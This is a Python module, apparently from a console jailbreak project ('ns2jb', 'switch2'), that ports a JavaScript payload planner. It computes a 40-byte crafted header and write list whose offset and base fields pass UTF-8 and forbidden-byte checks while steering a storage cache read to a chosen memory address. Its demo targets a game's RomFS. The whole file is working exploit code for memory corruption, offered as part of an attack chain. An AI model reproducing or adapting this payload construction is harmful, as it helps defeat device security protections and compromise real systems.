"""Port of ns2jb's signed-cache-plan.cjs: bounded byte-arithmetic planner.

Pure arithmetic — never contacts a console. Given a measured target address,
a measured storage size, and a bucket cycle, produces the 40-byte UTF-8
"signed one-shot" header plus the copyField write list. Byte-compatible
with the reference: the selftest cross-checks plan() output against the
original .cjs via node.

Reference: research/ns2jb/engine/switch2/memory/signed-cache-plan.cjs
Semantics preserved exactly (including the memoized backtracking search,
the 5 s deadline, and the independent post-hoc arithmetic checks):
  - The offset field (header bytes 0..7, little-endian signed) and the base
    field (bytes 0x20..0x27, little-endian unsigned) must both decode as
    valid UTF-8 words containing no NUL/'/'/'\\' bytes.
  - offset = base - bias (little-endian byte addition with carry), so the
    two fields are linked by the requested displacement.
  - (offset >> 14) % bucketCount == 0: the low `power` bits are forced to
    zero via mask bits derived from zeroBits = (2**power - 1) * BLOCK, and
    the remaining residue mod `odd` is matched against wanted = 2**50 % odd
    (the 50-bit unsigned shift's residue; offset is negative because its
    top byte is fixed at 0x81).
"""

import time

BLOCK = 0x4000
RANGE = 0x7E7E7E7E7E7E7E7E
FORBIDDEN = (0x00, 0x2F, 0x5C)  # NUL, '/', '\\'


def _utf8_step(state, byte):
    """state = (remaining, low, high); returns the next state or None."""
    remaining, low, high = state
    if remaining:
        if byte < low or byte > high:
            return None
        return (remaining - 1, 0x80, 0xBF) if remaining > 1 else (0, 0, 0)
    if 1 <= byte <= 0x7F:
        return (0, 0, 0)
    if 0xC2 <= byte <= 0xDF:
        return (1, 0x80, 0xBF)
    if byte == 0xE0:
        return (2, 0xA0, 0xBF)
    if 0xE1 <= byte <= 0xEF:
        return (2, 0x80, 0x9F if byte == 0xED else 0xBF)
    if byte == 0xF0:
        return (3, 0x90, 0xBF)
    if 0xF1 <= byte <= 0xF4:
        return (3, 0x80, 0x8F if byte == 0xF4 else 0xBF)
    return None


def _encode_offset(bias, bucket_count, deadline):
    """Find an 8-byte LE offset word so that offset and offset+bias are both
    valid UTF-8 without forbidden bytes and (offset >> 14) % bucket_count == 0.
    Returns (offset_signed, base_unsigned) or None."""
    if not 0 <= bias < 2 ** 39:
        return None
    odd, power = bucket_count, 0
    while odd % 2 == 0:
        odd //= 2
        power += 1
    zero_bits = (2 ** power - 1) * BLOCK
    displacement = bias.to_bytes(8, "little")
    wanted = (1 << 50) % odd
    misses = set()
    visits = 0

    def choose(position, left_state, right_state, carry, remainder):
        nonlocal visits
        visits += 1
        if visits % 4096 == 0 and time.monotonic() > deadline:
            raise TimeoutError("No signed cache encoding found within five seconds")
        if position == 8:
            return [] if left_state[0] == 0 and right_state[0] == 0 \
                and remainder == wanted else None
        key = (position, left_state, right_state, carry, remainder)
        if key in misses:
            return None
        first = 0xC2 if position == 6 else 0x81 if position == 7 else 1
        last = first if position >= 6 else 0xF4
        mask = (zero_bits >> (position * 8)) & 0xFF
        for left in range(first, last + 1):
            if left in FORBIDDEN or (left & mask):
                continue
            total = left + displacement[position] + carry
            right = total & 0xFF
            if right in FORBIDDEN:
                continue
            next_left = _utf8_step(left_state, left)
            next_right = _utf8_step(right_state, right)
            if next_left is None or next_right is None:
                continue
            if position == 1:
                contribution = left >> 6
            elif position >= 2:
                contribution = left * pow(2, position * 8 - 14, odd)
            else:
                contribution = 0
            suffix = choose(position + 1, next_left, next_right, total >> 8,
                            (remainder + contribution) % odd)
            if suffix is not None:
                return [left, *suffix]
        misses.add(key)
        return None

    found = choose(0, (0, 0, 0), (0, 0, 0), 0, 0)
    if found is None:
        return None
    offset = int.from_bytes(bytes(found), "little", signed=True)
    return offset, (offset + bias) % (1 << 64)


def _prefix_for(target, storage_size, cycle):
    """Search (bucket start, within) pairs for the first encodable read
    offset; returns (header_bytes, read_offset)."""
    deadline = time.monotonic() + 5.0
    for start in range(0, storage_size - BLOCK + 1, cycle):
        for within in (0, 0x40, 0x140, 0x200):
            read_offset = start + within
            if read_offset + BLOCK > storage_size:
                continue
            encoded = _encode_offset(target - read_offset, cycle // BLOCK, deadline)
            if encoded is None:
                continue
            offset, base = encoded
            out = bytearray(b"\x41" * 0x28)
            out[0:8] = offset.to_bytes(8, "little", signed=True)
            out[8:16] = RANGE.to_bytes(8, "little")
            out[0x10:0x14] = b"\x01\x01\x01\x01"
            out[0x20:0x28] = base.to_bytes(8, "little")
            return bytes(out), read_offset
    raise ValueError("No signed cache encoding fits the measured storage")


def plan(target, storage_size, cycle=0x28000):
    """Build the signed-one-shot plan for one (target, storageSize, cycle).

    Returns the plan dict matching fs-memory-control.cjs's expectations:
    encoding/headerFormat 'signed-one-shot', target, base (hex string),
    entryOffset (decimal string), readOffset, addressBias, block, cycle,
    bytes (the 40-byte header), writes [{end: 0x28, bytes}], and the
    qualification note. Raises ValueError on bad arguments or when the
    independent post-hoc checks fail (mirroring the .cjs exactly)."""
    if not (isinstance(target, int) and 0x100000000 <= target < 2 ** 39):
        raise ValueError("Target must fit the qualified 39-bit address width")
    if not (isinstance(storage_size, int) and storage_size >= 0x4000):
        raise ValueError("Expected a measured storage size")
    if cycle not in (0x28000, 0x500000):
        raise ValueError("Unsupported bucket period")
    header, read_offset = _prefix_for(target, storage_size, cycle)
    offset = int.from_bytes(header[0:8], "little", signed=True)
    range_ = int.from_bytes(header[8:16], "little")
    base = int.from_bytes(header[0x20:0x28], "little")
    bucket_count = cycle // BLOCK
    try:
        assert len(header) == 0x28
        header.decode("utf-8")  # isUtf8 equivalent (rejects overlong/surrogate)
        assert not any(b in header for b in FORBIDDEN)
        assert offset < 0
        assert (offset >> 14) % bucket_count == 0
        assert 0 <= read_offset and read_offset + 0x4000 <= storage_size
        assert (read_offset // 0x4000) % bucket_count == 0
        assert read_offset + 0x4000 <= offset + range_
        assert offset + range_ < (1 << 63)
        assert (base + read_offset - offset) % (1 << 64) == target
    except AssertionError:
        raise ValueError("The signed prefix failed independent arithmetic/encoding checks")
    return {
        "encoding": "signed-one-shot",
        "headerFormat": "signed-one-shot",
        "target": target,
        "base": "0x%x" % base,
        "entryOffset": str(offset),
        "readOffset": read_offset,
        "addressBias": target - read_offset,
        "block": 0x4000,
        "cycle": cycle,
        "bytes": header,
        "writes": [{"end": 0x28, "bytes": header}],
        "qualification": "Native qualification required",
    }


if __name__ == "__main__":
    # Smoke demo: plan one plausible target for Civ's 4.975 GB RomFS storage.
    demo = plan(0x123456789, 4975000000, 0x28000)
    print("target 0x%x cycle 0x%x -> readOffset %d base %s entryOffset %s" %
          (demo["target"], demo["cycle"], demo["readOffset"], demo["base"],
           demo["entryOffset"]))
    print("header:", demo["bytes"].hex())
